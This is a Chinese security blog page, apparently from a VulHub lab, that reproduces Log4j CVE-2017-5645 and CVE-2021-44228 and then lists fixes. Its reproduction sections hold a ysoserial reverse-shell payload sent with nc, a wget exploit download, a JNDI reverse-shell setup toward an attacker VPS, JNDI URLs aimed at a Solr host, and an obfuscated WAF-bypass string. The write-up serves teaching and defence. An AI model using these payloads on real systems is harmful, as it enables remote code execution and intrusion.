@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang='zh-CN'>
+
+
+<head>
+  <meta charset="utf-8">
+  <meta name="hexo-theme" content="https://github.com/xaoxuu/hexo-theme-stellar/tree/1.23.0" theme-name="Stellar" theme-version="1.23.0">
+  
+  <meta name="generator" content="Hexo 7.1.1">
+  <meta http-equiv='x-dns-prefetch-control' content='on' />
+  
+  <meta name="renderer" content="webkit">
+  <meta name="force-rendering" content="webkit">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  <meta name="HandheldFriendly" content="True" >
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="theme-color" content="#f8f8f8">
+  
+  <title>VulHub-Log4j漏洞复现 - SafeKiller Zone</title>
+
+  
+    <meta name="description" content="Apache Log4j Server 反序列化命令执行(CVE-2017-5645)漏洞概述Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之 前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。利用版本:  Log4j 2.x&lt;&#x3D;2.8.1  漏洞复现 需要下载nc并且配置环境变量 然后使用ysos">
+<meta property="og:type" content="article">
+<meta property="og:title" content="VulHub-Log4j漏洞复现">
+<meta property="og:url" content="https://jiangjiyue.github.io/2023/04/05/8b1917af/index.html">
+<meta property="og:site_name" content="SafeKiller Zone">
+<meta property="og:description" content="Apache Log4j Server 反序列化命令执行(CVE-2017-5645)漏洞概述Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之 前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。利用版本:  Log4j 2.x&lt;&#x3D;2.8.1  漏洞复现 需要下载nc并且配置环境变量 然后使用ysos">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210191331614.png#crop=0&crop=0&crop=1&crop=1&id=Ck49r&originHeight=553&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210191427398.png#crop=0&crop=0&crop=1&crop=1&id=kMqtW&originHeight=1027&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="og:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210191423103.png#crop=0&crop=0&crop=1&crop=1&id=aqnT9&originHeight=861&originWidth=1218&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+<meta property="article:published_time" content="2023-04-05T11:45:28.000Z">
+<meta property="article:modified_time" content="2024-02-05T03:19:51.860Z">
+<meta property="article:author" content="Kill3r">
+<meta property="article:tag" content="Nday">
+<meta property="article:tag" content="渗透测试">
+<meta property="article:tag" content="漏洞利用">
+<meta property="article:tag" content="VulHub">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210191331614.png#crop=0&crop=0&crop=1&crop=1&id=Ck49r&originHeight=553&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title=">
+  
+  
+  
+  <meta name="keywords" content="Nday,渗透测试,漏洞利用,VulHub">
+
+  <!-- feed -->
+  
+    <link rel="alternate" href="/atom.xml" title="SafeKiller Zone" type="application/atom+xml">
+  
+
+  
+    
+<link rel="stylesheet" href="/css/main.css">
+
+  
+
+  
+    <link rel="shortcut icon" href="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg">
+  
+
+  
+
+  
+  <link rel="stylesheet" href="https://npm.elemecdn.com/lxgw-wenkai-screen-webfont/style.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.2/css/all.min.css" integrity="sha512-z3gLpd7yknf1YoNbCzqRKc4qyor8gaKU1qmn+CShxbuBusANI9QpRohGBreCFkKxLhei6S9CQXFEbbKuqLg0DA==" crossorigin="anonymous" referrerpolicy="no-referrer" /><link rel="stylesheet" href="/css/darkmode.css">
+</head>
+
+<body>
+  
+
+
+
+
+  <div class='l_body' id='start'>
+    <aside class='l_left' layout='post'>
+    
+
+  
+
+<header class="header"><div class="logo-wrap"><a class="avatar" href="/about/"><div class="bg" style="opacity:0;background-image:url(https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/avatar/round/rainbow64@3x.webp);"></div><img no-lazy class="avatar" src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202401260729165.jpg" onerror="javascript:this.classList.add('error');this.src='https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/image/2659360.svg';"></a><a class="title" href="/"><div class="main" ff="title">SafeKiller Zone</div><div class="sub normal cap">安全学的再好又有什么用</div><div class="sub hover cap" style="opacity:0"> 连自己喜欢的人都留不住</div></a></div>
+
+<nav class="menu dis-select"><a class="nav-item active" href="/"><i class="fa-solid fa-house-chimney"></i></a><a class="nav-item" href="/wiki/"><i class="fa-solid fa-book"></i></a><a class="nav-item" href="/bookmark/"><i class="fa-solid fa-icons"></i></a><a class="nav-item" href="/friends/"><i class="fa-brands fa-squarespace"></i></a><a class="nav-item" href="/about/"><i class="fa-solid fa-plus fa-flip"></i></a></nav>
+</header>
+
+
+<div class="widgets">
+
+
+<widget class="widget-wrapper search"><div class="widget-body"><div class="search-wrapper" id="search"><form class="search-form"><input type="text" class="search-input" id="search-input" placeholder="站内搜索"><svg t="1670596976048" class="icon search-icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="2676" width="200" height="200"><path d="M938.2 832.6L723.8 618.1c-2.5-2.5-5.3-4.4-7.9-6.4 36.2-55.6 57.3-121.8 57.3-193.1C773.3 222.8 614.6 64 418.7 64S64 222.8 64 418.6c0 195.9 158.8 354.6 354.6 354.6 71.3 0 137.5-21.2 193.2-57.4 2 2.7 3.9 5.4 6.3 7.8L832.5 938c14.6 14.6 33.7 21.9 52.8 21.9 19.1 0 38.2-7.3 52.8-21.8 29.2-29.1 29.2-76.4 0.1-105.5M418.7 661.3C284.9 661.3 176 552.4 176 418.6 176 284.9 284.9 176 418.7 176c133.8 0 242.6 108.9 242.6 242.7 0 133.7-108.9 242.6-242.6 242.6" p-id="2677"></path></svg></form><div id="search-result"></div><div class="search-no-result">没有找到内容！</div></div></div></widget>
+
+
+<widget class="widget-wrapper toc single" id="data-toc" collapse="false"><div class="widget-header cap dis-select"><span class="name">VulHub-Log4j漏洞复现</span></div><div class="widget-body fs14"><div class="doc-tree active"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Log4j-Server-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-CVE-2017-5645"><span class="toc-text">Apache Log4j Server 反序列化命令执行(CVE-2017-5645)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE"><span class="toc-text">修复建议</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Apache-Log4j2-lookup-JNDI-%E6%B3%A8%E5%85%A5-CVE-2021-44228"><span class="toc-text">Apache Log4j2 lookup JNDI 注入(CVE-2021-44228)</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%A6%82%E8%BF%B0-1"><span class="toc-text">漏洞概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">漏洞复现</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%AE%E5%A4%8D%E5%BB%BA%E8%AE%AE-1"><span class="toc-text">修复建议</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%B0%86-log4j-core-%E5%8D%87%E7%BA%A7%E5%88%B0-2-15-0-%E7%89%88%E6%9C%AC"><span class="toc-text">将 log4j-core 升级到 2.15.0 版本</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%8E%A5%E5%85%A5%E5%AE%89%E5%85%A8%E4%BA%A7%E5%93%81"><span class="toc-text">接入安全产品</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E%E7%B1%BB"><span class="toc-text">删除漏洞类</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E9%80%9A%E8%BF%87%E9%85%8D%E7%BD%AE%E7%A6%81%E7%94%A8-log4j-%E7%9A%84-lookup-%E5%8A%9F%E8%83%BD"><span class="toc-text">通过配置禁用 log4j 的 lookup 功能</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E6%97%A5%E5%BF%97%E8%BE%93%E5%87%BA-Pattern-%E6%A0%BC%E5%BC%8F"><span class="toc-text">设置日志输出 Pattern 格式</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AEJVM%E7%B3%BB%E7%BB%9F%E5%B1%9E%E6%80%A7"><span class="toc-text">设置JVM系统属性</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6"><span class="toc-text">修改配置文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E8%AE%BE%E7%BD%AE%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F"><span class="toc-text">设置进程环境变量</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8D%87%E7%BA%A7JDK%E7%89%88%E6%9C%AC"><span class="toc-text">升级JDK版本</span></a></li></ol></li></ol></li></ol></div></div></widget>
+
+
+</div>
+<footer class="footer dis-select"><div class="social-wrap"><a class="social" href="https://github.com/JiangJiYue" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-github"></i></a><a class="social" href="https://space.bilibili.com/238008115" target="_blank" rel="external nofollow noopener noreferrer"><i class="fa-brands fa-bilibili fa-bounce"></i></a><a class="social" href="/atom.xml" rel="noopener noreferrer"><i class="fa-solid fa-rss fa-shake"></i></a><a class="social" href="/comments/" rel="noopener noreferrer"><i class="fa-regular fa-comment-dots"></i></a><a class="social" href="javascript:void(0);" rel="noopener noreferrer"><i class="fa-solid fa-circle-half-stroke fa-flip"></i></a></div></footer>
+
+    </aside>
+    <div class='l_main'>
+      
+
+      
+
+<div class="bread-nav fs12"><div class="left"><div id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a><span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a> <span class="sep"></span> <a class="cap breadcrumb-link" href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/VulHub/">VulHub</a></div><div id="post-meta"><span class="author">发布于</span>
+    <span class="created"><time datetime="2023-04-05T11:45:28.000Z">2023-04-05</time></span>
+    
+    <span class="updated">，更新于&nbsp;<time datetime="2024-02-05T03:19:51.860Z">2024-02-05</time></span>
+    </div></div></div>
+
+<article class='md-text content post'>
+<h1 class="article-title"><span>VulHub-Log4j漏洞复现</span></h1>
+<h2 id="Apache-Log4j-Server-反序列化命令执行-CVE-2017-5645"><a href="#Apache-Log4j-Server-反序列化命令执行-CVE-2017-5645" class="headerlink" title="Apache Log4j Server 反序列化命令执行(CVE-2017-5645)"></a>Apache Log4j Server 反序列化命令执行(CVE-2017-5645)</h2><h3 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p>Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之 前的2.x版本中存在安全漏洞。攻击者可利用该漏洞执行任意代码。<br /><strong>利用版本:</strong></p>
+<ul>
+<li>Log4j 2.x&lt;&#x3D;2.8.1</li>
+</ul>
+<h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li>需要下载nc并且配置环境变量</li>
+<li>然后使用ysoserial生成payload,然后直接发送给your-ip:4712端口即可</li>
+</ol>
+<p><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections5 &quot;bash -c &#123;echo,YOUR-BASE64-ENCODE&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; | nc 192.168.2.187 4712</code><br /><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210191331614.png#crop=0&crop=0&crop=1&crop=1&id=Ck49r&originHeight=553&originWidth=1280&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
+<h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><ul>
+<li>使用Java 7+的用户应立即升级至2.8.2版本或者避免使用socket server的相关类，<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/LOG4J2/fixforversion/12339750/?selectedTab=com.atlassian.jira.jira-projects-plugin:version-summary-panel">参考链接</a> ；</li>
+<li>使用Java 6的用户应该避免使用TCP或者UDP 的socket server相关类，用户也可以手动添加2.8.2版本更新的相关代码来解决该漏洞；</li>
+<li>目前官方发布了<a target="_blank" rel="noopener" href="https://issues.apache.org/jira/browse/LOG4J2/fixforversion/12339208/?selectedTab=com.atlassian.jira.jira-projects-plugin:version-summary-panel">2.9最新版本</a> ，强烈建议更新到最新版本。</li>
+</ul>
+<h2 id="Apache-Log4j2-lookup-JNDI-注入-CVE-2021-44228"><a href="#Apache-Log4j2-lookup-JNDI-注入-CVE-2021-44228" class="headerlink" title="Apache Log4j2 lookup JNDI 注入(CVE-2021-44228)"></a>Apache Log4j2 lookup JNDI 注入(CVE-2021-44228)</h2><h3 id="漏洞概述-1"><a href="#漏洞概述-1" class="headerlink" title="漏洞概述"></a>漏洞概述</h3><p><strong>利用版本:</strong></p>
+<ul>
+<li>2.0到2.14.1版本</li>
+</ul>
+<h3 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><ol>
+<li>漏洞触发点:<code>http://103.116.46.7:8983/solr/admin/cores?action=</code></li>
+<li>漏洞探测:<code>http://103.116.46.7:8983/solr/admin/cores?action=$&#123;jndi:ldap://$&#123;sys:java.version&#125;.sxy8s9.dnslog.cn&#125;</code>	<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210191427398.png#crop=0&crop=0&crop=1&crop=1&id=kMqtW&originHeight=1027&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+<li>下载工具进行反弹shell<code>wget https://security-1258894728.cos.ap-beijing.myqcloud.com/writeup/vulhub/log4j/JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar</code></li>
+<li>运行<code>java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,YOUR-BASE64-ENCODE&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot; -A &quot;YOUR-ATTACK-VPS-IP&quot;</code></li>
+<li>方式一:网址输入:<code>http://103.116.46.7:8983/solr/admin/cores?action=$&#123;jndi:ldap://YOUR-ATTACK-VPS-IP:1389/Exploit&#125;</code></li>
+<li>方式二将上方抓包改为POST传参</li>
+<li>结果	<img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210191423103.png#crop=0&crop=0&crop=1&crop=1&id=aqnT9&originHeight=861&originWidth=1218&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></li>
+</ol>
+<h3 id="修复建议-1"><a href="#修复建议-1" class="headerlink" title="修复建议"></a>修复建议</h3><h4 id="将-log4j-core-升级到-2-15-0-版本"><a href="#将-log4j-core-升级到-2-15-0-版本" class="headerlink" title="将 log4j-core 升级到 2.15.0 版本"></a>将 log4j-core 升级到 2.15.0 版本</h4><h4 id="接入安全产品"><a href="#接入安全产品" class="headerlink" title="接入安全产品"></a>接入安全产品</h4><p>第一时间上WAF规则、RASP拦截等措施，给修复争取时间。<br />但是也要注意一些静态规则上的绕过，log4j 支持的写法比较多，有非常多绕过姿势。比如：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$&#123;$&#123;lower:j&#125;$&#123;upper:n&#125;$&#123;lower:d&#125;$&#123;upper:i&#125;:$&#123;lower:r&#125;m$&#123;lower:i&#125;&#125;://xxxxxxx.xx/poc&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="删除漏洞类"><a href="#删除漏洞类" class="headerlink" title="删除漏洞类"></a>删除漏洞类</h4><p>通过删除漏洞类进行修复的方案比较稳，也是官方推荐的一种修复方案。直接删除 log4j jar 包中存在漏洞的类：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.class</span><br></pre></td></tr></table></figure>
+<p>这种修复比较方便快捷，一般业务代码也不会用到 jndi lookup 这个功能。不过可能会对基于版本号判定的安全数据采集造成一定困扰，无法准确统计漏洞的最新受影响情况。建议删除之后在 jar 包后面加上一定的标记，如： log4j-2.14.1.sec.jar<br />另外，由于某些原因不想删除的话，可以自己代码替换原始的 JndiLookup 类，将它加到业务代码中。需要注意的是，必须保证它在 log4j 原类之前加载。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.apache.logging.log4j.core.lookup;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JndiLookup</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">JndiLookup</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NoClassDefFoundError</span>(<span class="string">&quot;JNDI lookup is disabled&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>也可以做成依赖包，在 log4j-core 之前添加，可以实现同样的效果（注意不要引入不可信的第三方依赖，可能导致潜在安全风险，以下配置来源互联网，仅作为示例，请勿直接使用）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.glavo&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;log4j-patch&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;1.0&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
+<p>当然也可以通过RASP的方式干掉漏洞类，Github上有不少RASP的无损修复方案，比如：</p>
+<h4 id="通过配置禁用-log4j-的-lookup-功能"><a href="#通过配置禁用-log4j-的-lookup-功能" class="headerlink" title="通过配置禁用 log4j 的 lookup 功能"></a>通过配置禁用 log4j 的 lookup 功能</h4><p>禁用的方式就比较多了。<strong>然而下面2、3、4这几种方式对低于 2.10 版本的 log4j-core 都没有效果</strong>，而且环境变量和启动参数这种设置，在迁移或者变更的过程中丢失的可能性比较大。log4j 在 2.15.0 版本中默认就已经关闭了 lookup 功能。<br />log4j2.component.properties、log4j2.xml 默认放在 ClassPath 路径下，如：源代码的资源目录或者可执行程序所在的当前目录。</p>
+<h5 id="设置日志输出-Pattern-格式"><a href="#设置日志输出-Pattern-格式" class="headerlink" title="设置日志输出 Pattern 格式"></a>设置日志输出 Pattern 格式</h5><p>对于 &gt;&#x3D;2.7 的版本，在 log4j 中对每一个日志输出格式进行修改。在 %msg 占位符后面添加 {nolookups}，这种方式的适用范围比其他三种配置更广。比如在 log4j2.xml 中配置：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg&#123;nolookups&#125;%n&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br><span class="line">public class Test &#123;</span><br><span class="line">public static void main(String[] args) &#123;</span><br><span class="line">String t = &quot;$&#123;jndi:ldap://xxx.com/xxx&#125;&quot;;</span><br><span class="line">Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);</span><br><span class="line">logger.error(t);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h5 id="设置JVM系统属性"><a href="#设置JVM系统属性" class="headerlink" title="设置JVM系统属性"></a>设置JVM系统属性</h5><p>在 Java 应用启动参数中增加 -Dlog4j2.formatMsgNoLookups&#x3D;true，或者在业务代码中设置系统属性：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 必须在 log4j 实例化之前设置该系统属性</span><br><span class="line">System.setProperty(&quot;log4j2.formatMsgNoLookups&quot;, &quot;true&quot;);</span><br><span class="line"></span><br><span class="line">Logger logger = LogManager.getLogger(LogManager.ROOT_LOGGER_NAME);</span><br></pre></td></tr></table></figure>
+
+<h5 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a>修改配置文件</h5><p>在配置文件 log4j2.component.properties 中增加：log4j2.formatMsgNoLookups&#x3D;true，配置文件放置于应用程序的 ClassPath 路径下。</p>
+<h5 id="设置进程环境变量"><a href="#设置进程环境变量" class="headerlink" title="设置进程环境变量"></a>设置进程环境变量</h5><p>在环境变量中增加：LOG4J_FORMAT_MSG_NO_LOOKUPS&#x3D;true</p>
+<blockquote>
+<p>注意！这些配置和属性，并不能在所有场景下生效，比如在 logstash 中就无法生效： <strong>Solutions and Mitigations:</strong> The widespread flag -Dlog4j2.formatMsgNoLookups&#x3D;true does NOT mitigate the vulnerability in Logstash, as Logstash uses Log4j in a way where the flag has no effect. It is therefore necessary to remove the JndiLookup class from the log4j2 core jar, with the following command:</p>
+<p>zip -q -d &#x2F;logstash-core&#x2F;lib&#x2F;jars&#x2F;log4j-core-2.* org&#x2F;apache&#x2F;logging&#x2F;log4j&#x2F;core&#x2F;lookup&#x2F;JndiLookup.class</p>
+<p>Refer: <a target="_blank" rel="noopener" href="https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476">https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476</a></p>
+</blockquote>
+<h4 id="升级JDK版本"><a href="#升级JDK版本" class="headerlink" title="升级JDK版本"></a>升级JDK版本</h4><p>对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认就已经禁用了 RMI Reference、LDAP Reference 的远程加载。对于 RCE 来说，可以起到很直接的缓解作用，可以作为增强型的加固方案。<br />在高版本JDK环境下，JNDI注入也还是存在一定RCE风险，可以参考这篇文章：<br />另外 log4j 漏洞本身除了 RCE，还存在着巨大的攻击面，比如 SSRF、敏感信息泄露等等，威胁非常大，不要企图仅仅通过升级JDK版本来修复漏洞，建议还是老老实实升级。</p>
+
+
+
+<div class="article-footer reveal fs14">
+    <section id="license">
+      <div class="header"><span>许可协议</span></div>
+      <div class="body"><p>本文由 <a href="https://jiangjiyue.github.io/">kill3r</a> 原创,采用 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">署名-非商业性使用-相同方式共享 4.0 国际</a> 许可协议，转载请注明出处。</p>
+</div>
+    </section>
+    
+    <section id="share">
+      <div class="header"><span>分享文章</span></div>
+      <div class="body">
+        <div class="link"><input class="copy-area" readonly="true" id="copy-link" value="https://jiangjiyue.github.io/2023/04/05/8b1917af/" /></div>
+        <div class="social-wrap dis-select"><a class="social share-item wechat" onclick="util.toggle(&quot;qrcode-wechat&quot)"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/b32ef3da1162a.svg"/></a><a class="social share-item weibo" target="_blank" rel="external nofollow noopener noreferrer" href="https://service.weibo.com/share/share.php?url=https://jiangjiyue.github.io/2023/04/05/8b1917af/&title=VulHub-Log4j漏洞复现 - SafeKiller Zone&pics=https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402051117292.png&summary=Apache Log4j Server 反序列化命令执行(CVE-2017-5645)漏洞概述Apache Log4j是一个用于Java的日志记录库，其支持启动远程日志服务器。Apache Log4j 2.8.2之 前的2.x版本中存..."><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gcore.jsdelivr.net/gh/cdn-x/placeholder@1.0.9/social/80c07e4dbb303.svg"/></a><a class="social share-item email" href="mailto:?subject=VulHub-Log4j漏洞复现 - SafeKiller 